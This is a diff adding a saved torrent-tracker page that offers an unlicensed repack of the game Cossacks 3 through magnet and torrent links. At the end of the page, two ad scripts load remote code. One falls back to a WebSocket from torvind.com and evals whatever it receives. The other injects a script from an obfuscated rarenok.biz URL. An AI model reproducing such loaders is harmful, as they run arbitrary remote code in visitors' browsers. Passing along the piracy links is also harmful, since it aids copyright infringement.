@@ -1,0 +1,392 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: Казаки 3 / Cossacks 3 [v 2.0.9.87.5844 + 7 DLC] (2016) PC | Repack от =nemos=</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+	
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>Казаки 3 / Cossacks 3 [v 2.0.9.87.5844 + 7 DLC] (2016) PC | Repack от =nemos=</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script>
+
+
+
+<div id="download">
+<a href="magnet:?xt=urn:btih:079288fdd50ada2b836091d64294422742357852&amp;dn=rutor.info_%D0%9A%D0%B0%D0%B7%D0%B0%D0%BA%D0%B8+3+%2F+Cossacks+3+%5Bv+2.0.9.87.5844+%2B+7+DLC%5D+%282016%29+PC+%7C+Repack+%D0%BE%D1%82+%3Dnemos%3D&amp;tr=udp://opentor.org:2710&amp;tr=udp://opentor.org:2710&amp;tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/magnet.gif"></a>
+<!--<a href="/mail.php?send_torrent=630471"><img src="http://s.rutor.info/t/mails.png"></a>-->
+<a href="http://d.rutor.info/download/630471"><img src="http://s.rutor.info/t/down.png"> Скачать KAZAKI-3_RePack_nemos.torrent</a>
+<br />
+<a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a>
+<script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('http://rutor.info/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script>
+<a href="#" class="d_small" onclick="addEngine();">Добавить rutor.info в поисковую строку</a>
+</div>
+
+
+
+
+
+<table width="100%">
+<tr><td colspan="2" style="text-align:center;">
+<script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script>
+
+</td>
+</tr>
+</table>
+
+
+<table id="details">
+
+<tr><td style="vertical-align:top;"></td><td><br /><a href="http://imageban.ru" target="_blank"><img src="http://i5.imageban.ru/out/2017/03/21/12be70b644a7a6600732961e43fd00f3.jpg" /></a><br />
+<br />
+<b>Год выпуска:</b> 2016<br />
+<b>Жанр:</b>  Strategy (Real-time), <a href="/tag/8/3D" target="_blank">3D</a>, <a href="/tag/8/Isometric" target="_blank">Isometric</a><br />
+<b>Разработчик:</b> GSC Game World<br />
+<b>Издательство:</b> GSC Game World<br />
+<b>Версия игры:</b> 2.0.9.87.5844<br />
+<b>Тип издания:</b> RePack<br />
+<b>Язык интерфейса:</b>  Русский, Украинский, Английский, Немецкий и другие<br />
+<b>Язык озвучки:</b>  Английский<br />
+<b>Таблетка:</b> Не требуется (DRM Free)<br />
+<br />
+<br />
+<br />
+<b>Системные требования:</b><br />
+√ <b>Операционная система:</b> Windows 7 / 8 / 10<br />
+√ <b>Процессор:</b> Intel Dual Core 1,6 GHz, AMD Athlon 64 3000+<br />
+√ <b>Оперативная память:</b> 2 Гб<br />
+√ <b>Видеокарта:</b> GeForce 8800 GT / Radeon HD 2600<br />
+√ <b>Звуковая карта:</b> Совместимая с DirectX 9.0c<br />
+√ <b>Свободное место на жёстком диске:</b> 11 Гб<br />
+<br />
+<br />
+<br />
+<b>Описание:</b><br />
+&quot;Казаки 3&quot; - классическая RTS с редким сочетанием войны, экономики, строительства и технологического развития, которое нельзя встретить ни в одной игре за последние 15 лет. Продолжение культовой игровой серии позволит снова окунуться в золотой век жанра стратегий. В «Казаках 3» будет 12 играбельных наций, включая Россию, Украину, Англию, Францию и Австрию. У каждой нации будут уникальные войска и здания. Помимо сюжетных исторических кампаний в «Казаках 3» будет сетевой режим для семи игроков и возможность сыграть против компьютера на карте, созданной случайным образом. Игрок сможет управлять как отдельными солдатами, так и целыми отрядами. В комплект с игрой будет входить редактор карт и инструментарий для создания модов.<br />
+<br />
+<a href="http://i3.imageban.ru/out/2018/03/23/6f7eadc3681df1b557a9b698df73c8a1.jpg" target="_blank"><img src="http://i5.imageban.ru/out/2018/03/23/70bc2a40787544e05e9c507f125a497f.png" /></a>  <a href="http://i6.imageban.ru/out/2018/03/23/59a606f5f753ec987d78d709c233568a.jpg" target="_blank"><img src="http://i5.imageban.ru/out/2018/03/23/81d4b8d74be295539cfbdc4d3366de43.png" /></a>  <a href="http://i5.imageban.ru/out/2018/03/23/c235a25bd840f84d64d7c871d35c1c83.jpg" target="_blank"><img src="http://i4.imageban.ru/out/2018/03/23/4a66206d3ba7a67a6178368b02874933.png" /></a>  <a href="http://i3.imageban.ru/out/2018/03/23/8565fd7b5beaeba3f12e7881e83280c9.jpg" target="_blank"><img src="http://i2.imageban.ru/out/2018/03/23/5a0fc9d0f246bd08b34a1f873eb16291.png" /></a><br />
+<br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Скриншоты установщика:</div><div class="hidebody"></div><textarea class="hidearea"><br />
+<a href="http://i6.imageban.ru/out/2016/09/21/80219c7b490beafc2b008178f547091a.png" target="_blank"><img src="http://i6.imageban.ru/out/2016/09/21/c6230dc8491ddb9a7d5f993417e43676.png" /></a>  <a href="http://i4.imageban.ru/out/2016/09/21/241fa8e99f6a4a63c539a8ca2431e76b.png" target="_blank"><img src="http://i5.imageban.ru/out/2016/09/21/6430dcb7696c1c16fb1b4c90e9698551.png" /></a>  <a href="http://i1.imageban.ru/out/2016/09/21/8a48218183231c33632f1fdaf5fdbefc.png" target="_blank"><img src="http://i3.imageban.ru/out/2016/09/21/97063e75bd200fc5a76642e9182bf832.png" /></a><br />
+</textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Особенности Игры:</div><div class="hidebody"></div><textarea class="hidearea"><br />
+<li>Захватывающая историческая стратегия реального времени.<br />
+<li>Действия разворачиваются на территории Европы XVII–XVIII вв.<br />
+<li>Пять исторических кампаний в однопользовательском режиме.<br />
+<li>12 противоборствующих стран.<br />
+<li>Грандиозные сражения до 10 000 юнитов на карте.<br />
+<li>Реалистичная физика полета пуль и ядер.<br />
+<li>Существенное влияние ландшафта на тактику сражений.<br />
+<li>Бесконечные вариации битв с компьютерными противниками на случайных картах.<br />
+<li>Гибкий генератор случайных карт с выбором предпочитаемого ландшафта.</li></li></li></li></li></li></li></li></li></textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Дополнения:</div><div class="hidebody"></div><textarea class="hidearea"><br />
+<li>Deluxe Content - Cossacks 3: Days of Brilliance<br />
+<li>Deluxe Content - Cossacks 3: Rise to Glory<br />
+<li>Expansion - Cossacks 3: Guardians of the Highlands<br />
+<li>Deluxe Content - Cossacks 3: Path to Grandeur<br />
+<li>Seasonal Event - Cossacks 3: Christmas Gift<br />
+<li>Seasonal Event - Cossacks 3: Summer Fair<br />
+<li>Deluxe Content - Cossacks 3: The Golden Age<br />
+</li></li></li></li></li></li></li></textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Особенности релиза:</div><div class="hidebody"></div><textarea class="hidearea"><br />
+<li>За основу взята лицензия от GOG<br />
+<li>Версия игры - 2.0.9.87.5844<br />
+<li>Игра поддерживает языки: Русский, Украинский, Английский, Французский, Немецкий, Чешский, Польский, Португальский<br />
+<li>Ничего не перекодировано<br />
+<li>Ничего не вырезано<br />
+<li>Пути реестра сохранены<br />
+<li>Присутствуют вышедшие дополнения<br />
+<li>После инсталляции игра занимает ~ 10 Гб<br />
+<li>Установка ~ 2 мин<br />
+<br />
+<li>Релиз от =nemos=</li></li></li></li></li></li></li></li></li></li></textarea></div><br />
+<br />
+<b>08.05.18</b>: Игра обновлена до версии 2.0.9.87.5844<br />
+<br />
+<b> RePack by =nemos=</b>  <img src="http://i79.fastpic.ru/big/2016/0417/72/3e1229545e2ef84561329213d93f7272.png" /></td></tr>
+<tr><td class="header">Залил</td><td><b><a href="/browse/0/0/1418964/0" target="_blank">R.G. Resident</a></b></td></tr>
+<tr><td class="header">Оценка</td><td>Никто ещё не поставил оценку</td></tr>
+<tr><td class="header">Категория</td><td><a href="/games" target="_blank">Игры </a></td></tr>
+<tr><td class="header">Раздают</td><td>33</td></tr>
+<tr><td class="header">Качают</td><td>13</td></tr>
+<tr><td class="header">Сидер замечен</td><td>09-05-2018 8:19:06 (22 минуты назад)</td></tr>
+<tr><td class="header">Добавлен</td><td>08-05-2018 12:16:25  (20 часов назад)</td></tr>
+<tr><td class="header">Размер</td><td>1.64&nbsp;GB  (1757789017 Bytes)</td></tr>
+
+<tr>
+	<td class="header" nowrap="nowrap">Добавить в</td>
+	<td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 630471);">закладки</span></td>
+</tr>
+
+<tr><td colspan="2"><div id="index"><fieldset style="border: 1px solid #3C95D1;"><legend style="font-weight: bold;">Связанные раздачи</legend><table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr><tr class="gai"><td>03&nbsp;Май&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/609283"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:1004454c9c388dc8e9d489ca57e59f8240a52dc0&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/609283/kazaki-3_cossacks-3-v-2.0.8.87.5843-7-dlc-2016-pc-repack-ot-xatab">Казаки 3 / Cossacks 3 [v 2.0.8.87.5843 + 7 DLC] (2016) PC | RePack от xatab </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">1.66&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;169</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;9</span></td></tr><tr class="tum"><td>03&nbsp;Май&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/629608"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:244ecf83bb96e2827a6270092526d868c143d4d4&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/629608/kazaki-3_cossacks-3-v-2.0.8.87.5843-7-dlc-2016-pc-licenzija">Казаки 3 / Cossacks 3 [v 2.0.8.87.5843 + 7 DLC] (2016) PC | Лицензия </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">2.77&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;85</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;3</span></td></tr><tr class="gai"><td>03&nbsp;Апр&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/623790"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:23fb4b0e356600e2bb35c945f2de412e087e5c8c&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/623790/kazaki-3_cossacks-3-digital-deluxe-edition-2.0.7.87.5842-7-dlc-2016-pc-repack-ot-r.g-catalyst">Казаки 3 / Cossacks 3 - Digital Deluxe Edition [2.0.7.87.5842 + 7 DLC] (2016) PC | RePack от R.G. Catalyst </a></td> 
+<td align="right">1.43&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;33</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;3</span></td></tr><tr class="tum"><td>23&nbsp;Мар&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/585158"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:23a6778594032ee4051183ab13469dfe54e29e1e&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/585158/kazaki-3_cossacks-3-digital-deluxe-edition-v-2.0.7.87.5842-7-dlc-2016-pc-repack-ot-qoob">Казаки 3 / Cossacks 3: Digital Deluxe Edition [v 2.0.7.87.5842 + 7 DLC] (2016) PC | RePack от qoob </a></td> <td align="right">8<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">1.67&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;197</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;4</span></td></tr><tr class="gai"><td>26&nbsp;Дек&nbsp;17</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/604270"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:68e3bfbcb94812ed04d9a9168f749ab328b669d2&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/604270/kazaki-3_cossacks-3-v-2.0.0.85.5767-7-dlc-2016-pc-repack-ot-r.g-mehaniki">Казаки 3 / Cossacks 3 [v 2.0.0.85.5767 + 7 DLC] (2016) PC | RePack от R.G. Механики </a></td> 
+<td align="right">1.56&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;116</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr></table><div style="width: 100%; text-align: right; margin-top: 4px; margin-bottom: -5px;"><a href="/search/0/8/0/0/Казаки 3" target="_blank">Искать ещё похожие раздачи</a></div></fieldset></div></td></tr>
+
+<tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/630471.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (5)</u></span></td><td>
+<div id="displayfiles" style="display:none;max-height:450px;overflow:auto;">
+<table id="files">
+<tr><td>Название</td><td>Размер</td></tr>
+<tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody>
+</table>
+</div>
+</td></tr>
+
+</table>
+<br />
+<br />
+
+<script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('userid') > 0) {
+		$("#cem").append(' | <a href="/edit.php?edit=630471">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(630471);">Промодерировать раздачу</span> | <span onclick="confirm_delete(630471);">Удалить</span>');
+		}
+	}
+});
+</script>
+
+
+<strong>
+<div style="text-align: center;" id="cem"><a href="/comment/630471">Написать комментарий</a>
+
+
+</div>
+</strong>
+
+<br/><br/>
+<script type="text/javascript">
+<!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//-->
+</script>
+	<script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="http://s.rutor.info/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img  src="http://s.rutor.info/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//-->
+</script>
+	<table width="100%" cellspacing="0" cellpadding="4"></table>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. 
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
